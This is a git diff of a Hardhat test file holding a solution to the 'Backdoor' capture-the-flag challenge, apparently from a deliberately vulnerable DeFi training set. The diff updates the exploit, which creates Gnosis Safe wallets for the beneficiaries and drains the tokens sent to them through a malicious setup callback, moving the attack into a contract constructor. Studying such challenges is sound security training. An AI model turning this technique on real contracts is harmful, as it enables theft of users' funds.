@@ -59,7 +59,7 @@ describe('[Challenge] Backdoor', function () {
      * Factory CALLS -> Proxy DELEGATECALLS -> Singleton Gnosis Safe
      * 
      * Now we can create new Gnosis safes with anyone as the owner which means
-     * we can create a safe on the behalf of the beneficiraies and then 
+     * we can create a safe on the behalf of the beneficiaries and then 
      * ensure the factory calls back to the WalletRegistry contract. During
      * this callback the contract will transfer 10 DVT to the newly created
      * Gnosis safe. However we are unable to access it since it is solely owned
@@ -102,10 +102,10 @@ describe('[Challenge] Backdoor', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
 
-        const attackerToken = this.token.connect(attacker);
-        const attackerFactory = this.walletFactory.connect(attacker);
-        const attackerMasterCopy = this.masterCopy.connect(attacker);
-        const attackerWalletRegistry = this.walletRegistry.connect(attacker);
+        const attackerToken = token.connect(player);
+        const attackerFactory = walletFactory.connect(player);
+        const attackerMasterCopy = masterCopy.connect(player);
+        const attackerWalletRegistry = walletRegistry.connect(player);
 
         // Helper Function
         const checkTokenBalance = async (address, name) => {
@@ -113,31 +113,25 @@ describe('[Challenge] Backdoor', function () {
             console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
         }
 
-        await checkTokenBalance(attacker.address, "Attacker");
+        await checkTokenBalance(player.address, "Attacker");
 
         // Deploy attacking contract
-        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
+        // Do exploit in one transaction in contract constructor
+
+        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", player);
         const attackModule = await AttackModuleFactory.deploy(
-            attacker.address,
+            player.address,
             attackerFactory.address,
             attackerMasterCopy.address,
             attackerWalletRegistry.address,
-            attackerToken.address
+            attackerToken.address,
+            users,
+            {
+                gasLimit: 1e7
+            }
         );
-        console.log("Deployed attacking module at", attackModule.address);
-
-        // ABI call to setupToken() which is malicious
-        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
-        const moduleIFace = new ethers.utils.Interface(moduleABI);
-        const setupData = moduleIFace.encodeFunctionData("setupToken", [
-            attackerToken.address, 
-            attackModule.address
-        ])
-
-        // Do exploit in one transaction (after contract deployment)
-        await attackModule.exploit(users, setupData);
-          
-        await checkTokenBalance(attacker.address, "Attacker");
+        console.log("Deployed attacking contract at", attackModule.address);
+        await checkTokenBalance(player.address, "Attacker");
 
     });
 
